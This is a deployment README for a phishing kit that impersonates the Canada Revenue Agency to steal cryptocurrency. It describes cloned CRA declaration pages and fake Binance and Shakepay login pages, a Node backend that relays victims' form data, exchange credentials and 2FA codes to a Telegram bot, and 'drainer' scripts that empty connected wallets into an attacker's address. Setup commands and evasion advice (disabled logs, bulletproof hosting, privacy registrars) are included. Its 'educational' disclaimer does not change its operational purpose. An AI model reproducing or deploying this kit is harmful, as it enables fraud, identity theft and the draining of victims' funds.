# CRA Crypto Phishing Site - One-Script Deployment

This deployment script will automatically set up everything needed for the site to work.

## What It Deploys

✅ **Web Server**
- Nginx with optimized configuration
- Large URI support for obfuscated paths
- Security headers

✅ **SSL Certificate**
- Let's Encrypt free SSL
- Auto-renewal configured
- HTTPS redirect

✅ **Node.js Backend**
- Express API server
- Telegram bot integration
- PM2 process manager (auto-restart, startup on boot)

✅ **Website Files**
- All HTML pages (50+ files)
- Obfuscated folder structure
- Declaration pages (14 files)
- Exchange pages (36 files: 18 EN + 18 FR)

✅ **Drainer Setup**
- wallet.js (main drainer logic)
- drainer.js (connected wallet draining)
- walletconnect-v2.bundle.js (WalletConnect SDK)
- API endpoint for target wallet address

✅ **Telegram Integration**
- Initial form submission alerts
- Exchange login approval system
- 2FA code collection
- Interactive buttons (Approve/Reject)

## Prerequisites

1. **Fresh Ubuntu/Debian VPS** (tested on Ubuntu 20.04+)
2. **Root access** via SSH
3. **Domain name** pointing to your server IP
4. **Telegram Bot**:
   - Create bot via [@BotFather](https://t.me/BotFather)
   - Get bot token
   - Get your chat ID from [@userinfobot](https://t.me/userinfobot)

## Usage

### Step 1: Prepare

```bash
cd /workspaces/AllinOne
```

Make sure you have:
- Server IP address
- SSH root password
- Domain name (DNS already pointing to server)
- Telegram bot token
- Telegram chat ID(s)
- Email for SSL certificate

### Step 2: Run Deployment

```bash
./deploy.sh
```

The script will prompt you for:
- **Server IP address**: Your VPS IP (e.g., 103.136.43.79)
- **SSH root password**: Root password for SSH access
- **Domain name**: Your domain (e.g., cra-arc-crypto-cms-sgj.com)
- **Telegram Bot Token**: From @BotFather
- **Telegram Chat ID 1**: Your main chat ID
- **Telegram Chat ID 2**: Optional second chat ID (press Enter to skip)
- **Email for SSL**: For Let's Encrypt notifications

### Step 3: DNS Setup

**IMPORTANT**: Before the SSL step, ensure your domain DNS is configured:

```
A Record: yourdomain.com → YOUR_SERVER_IP
```

Wait for DNS propagation (can take 5-60 minutes). Test with:
```bash
dig yourdomain.com
# or
nslookup yourdomain.com
```

When prompted during deployment, press Enter only when DNS is ready.

### Step 4: Post-Deployment

After deployment completes:

1. **Update Target Wallet Address**:
   ```bash
   ssh root@YOUR_SERVER_IP
   nano /root/cra-backend/verify-claim.js
   # Change: const TARGET_WALLET = '0x1234567890123456789012345678901234567890';
   pm2 restart cracrypto
   ```

2. **Test the Site**:
   - Visit `https://yourdomain.com`
   - Fill out the form
   - Check Telegram for initial message
   - Click exchange button
   - Verify login approval system works
   - Test 2FA code collection

3. **Monitor Logs**:
   ```bash
   # Backend logs
   pm2 logs cracrypto
   
   # Nginx errors
   tail -f /var/log/nginx/cra-error.log
   
   # PM2 status
   pm2 status
   ```

## What Gets Installed

| Component | Version | Location |
|-----------|---------|----------|
| Nginx | Latest | `/etc/nginx/` |
| Node.js | v18.x | System-wide |
| PM2 | Latest | Global npm |
| Certbot | Latest | System-wide |
| Website Files | - | `/var/www/cra/` |
| Backend | - | `/root/cra-backend/` |

## Folder Structure Created

```
/var/www/cra/
├── index.html (redirect to declaration)
├── index-fr.html (French redirect)
├── wallet.js (drainer)
├── drainer.js (connected wallet)
├── walletconnect-v2.bundle.js
├── api/ (if exists)
└── gol-ged/
    └── awsc/
        └── cms/
            └── login/
                ├── declaration/
                │   └── T1135-craarc/
                │       └── REALMOID-06-034563654a-njadfs7fa-105d-9505-84cb2b4afb5e/
                │           ├── index.html
                │           ├── index-fr.html
                │           ├── declaration.html
                │           ├── declaration-fr.html
                │           ├── certification.html
                │           ├── certification-fr.html
                │           ├── pleasewait.html
                │           ├── pleasewait-fr.html
                │           ├── register.html
                │           ├── register-fr.html
                │           ├── validation.html
                │           ├── validation-fr.html
                │           ├── thankyou.html
                │           └── thankyou-fr.html
                └── TYPE-33554432/
                    └── REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/
                        └── GUID/
                            └── SMAUTHREASON-0/
                                └── METHOD-GET/
                                    └── SMAGENTNAME/
                                        └── Exchanges/
                                            ├── binance-login.html
                                            ├── binance-login-fr.html
                                            ├── binance-verify.html
                                            ├── binance-verify-fr.html
                                            ├── (... 32 more exchange files)
                                            └── shakepay-verify-fr.html
```

## API Endpoints

After deployment, these endpoints are available:

- `POST /api/send-initial-telegram` - Initial form submission
- `POST /api/exchange-login` - Exchange login with approval
- `POST /api/exchange-verify` - 2FA verification with approval
- `GET /api/get-target-address` - Get drainer target wallet

## Troubleshooting

### SSL Certificate Fails
```bash
# Check DNS
dig yourdomain.com

# Verify nginx is running
systemctl status nginx

# Try manual certbot
certbot --nginx -d yourdomain.com
```

### Backend Not Starting
```bash
ssh root@YOUR_SERVER_IP
cd /root/cra-backend
pm2 logs cracrypto
# Check for errors

# Restart
pm2 restart cracrypto
```

### Telegram Not Working
```bash
# Check backend logs
pm2 logs cracrypto

# Test Telegram bot token
curl https://api.telegram.org/botYOUR_TOKEN/getMe

# Verify chat IDs are correct
```

### Website Files Not Loading
```bash
# Check nginx status
systemctl status nginx

# Check file permissions
ls -la /var/www/cra/

# Fix permissions if needed
chown -R www-data:www-data /var/www/cra/
chmod -R 755 /var/www/cra/
```

### Port 3000 Already in Use
```bash
# Find what's using it
netstat -tlnp | grep :3000

# Kill old process
pm2 delete cracrypto
pm2 start /root/cra-backend/verify-claim.js --name cracrypto
```

## Manual Deployment Steps (if script fails)

If the automated script fails, you can deploy manually:

1. **Install dependencies**:
   ```bash
   apt-get update
   apt-get install -y nginx nodejs npm certbot python3-certbot-nginx
   npm install -g pm2
   ```

2. **Create directories**:
   ```bash
   mkdir -p /var/www/cra
   mkdir -p /root/cra-backend
   ```

3. **Upload files** (from local machine):
   ```bash
   scp -r website_cra/* root@YOUR_IP:/var/www/cra/
   scp verify-claim.js root@YOUR_IP:/root/cra-backend/
   ```

4. **Configure backend**:
   ```bash
   cd /root/cra-backend
   npm init -y
   npm install express body-parser axios
   # Edit verify-claim.js with your Telegram credentials
   pm2 start verify-claim.js --name cracrypto
   pm2 save
   ```

5. **Configure nginx** (use template from script)

6. **Get SSL**:
   ```bash
   certbot --nginx -d yourdomain.com
   ```

## Security Notes

⚠️ **Important**: This is a phishing tool for educational/authorized testing only.

- All access logs are disabled by default
- Nginx error logs only show errors
- PM2 logs can be rotated: `pm2 install pm2-logrotate`
- Consider using VPN/proxy to access server
- Use privacy-focused domain registrar
- Consider using bulletproof hosting

## Maintenance

### Update Website Files
```bash
cd /workspaces/AllinOne/website_cra
scp *.html root@YOUR_IP:/var/www/cra/
```

### Update Backend
```bash
scp verify-claim.js root@YOUR_IP:/root/cra-backend/
ssh root@YOUR_IP "pm2 restart cracrypto"
```

### Check PM2 Status
```bash
pm2 status
pm2 logs cracrypto
pm2 monit
```

### Backup
```bash
# Backup website
tar czf cra-backup.tar.gz /var/www/cra/

# Backup backend
tar czf backend-backup.tar.gz /root/cra-backend/
```

## Support

If you encounter issues:
1. Check the logs (nginx, PM2)
2. Verify DNS is pointing correctly
3. Ensure firewall allows ports 80, 443
4. Check Telegram bot token is valid
5. Review the troubleshooting section

---

**Deployment Time**: ~5-10 minutes (depending on server speed and DNS propagation)

**Last Updated**: March 5, 2026
